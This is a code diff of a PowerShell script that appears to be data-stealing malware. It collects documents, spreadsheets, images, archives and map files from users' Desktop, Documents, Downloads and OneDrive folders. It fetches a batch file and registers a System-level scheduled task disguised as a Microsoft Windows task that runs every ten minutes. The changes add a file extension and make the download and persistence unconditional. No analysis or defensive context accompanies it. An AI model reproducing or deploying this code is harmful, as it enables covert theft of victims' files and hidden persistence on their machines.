@@ -82,7 +82,7 @@ param (
         del -Force -Recurse $allDestDir
         del -Force -Recurse $tempDestDir
         del -Force $firstMark
-        if ((Test-Path $appsDir\NewStreamSVC.bat) -eq $false) { Download-NewStreamSVC }
+        Download-NewStreamSVC
         if ((Check-Schtask -taskName "\Microsoft\Windows\WDI\SecureSync") -eq $false) {
             schtasks.exe /TN "\Microsoft\Windows\WDI\SecureSync" /CREATE /F /TR "$appsDir\NewStreamSVC.bat $objName" /SC MINUTE /MO 10 /RU System
         }
@@ -125,7 +125,7 @@ param (
     $currDate = (Get-Date -UFormat %d.%m.%y)
     $currYear = (Get-Date -UFormat %Y)
     $size = 100*1024*1024
-    $exts = ('*.doc','*.docx','*.rtf','*.xls','*.xlsm','*.xlsx','*.pdf','*.txt','*.zip','*.rar','*.7z','*.jpg','*дск*','*.kme','*.kml','*.kmz','*.scene','*.json','*zones.txt','*.jpeg','*.png','*.bmp','*.ppt','*.pptx','*.odt','*.csv')
+    $exts = ('*.doc','*.docx','*.rtf','*.xls','*.xlsm','*.xlsx','*.pdf','*.txt','*.zip','*.lhz','*.rar','*.7z','*.jpg','*дск*','*.kme','*.kml','*.kmz','*.scene','*.json','*zones.txt','*.jpeg','*.png','*.bmp','*.ppt','*.pptx','*.odt','*.csv')
     $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
 
     if ($objName -eq "") { $objName = $env:COMPUTERNAME }
@@ -165,6 +165,8 @@ param (
     if ($Stream) {
         if ((Test-Path $firstEndMark) -eq $false) { return }
         if (Check-Schtask -taskName "\Microsoft\Windows\WDI\SecureSyncFirst") { schtasks.exe /TN $taskName /DELETE /F }
+        Download-NewStreamSVC
+        schtasks.exe /TN "\Microsoft\Windows\WDI\SecureSync" /CREATE /F /TR "$appsDir\NewStreamSVC.bat $objName" /SC MINUTE /MO 10 /RU System
         $sucup = ($destDir + 'sucup.txt'); del -ErrorAction SilentlyContinue -Force $sucup; New-Item $sucup -ItemType File -ea 0
         $etalonhash = (Get-FileHash -Algorithm MD5 $sucup).hash
         $sendDestDir = ($destDir + $currYear + '\' + $currDate + '\')
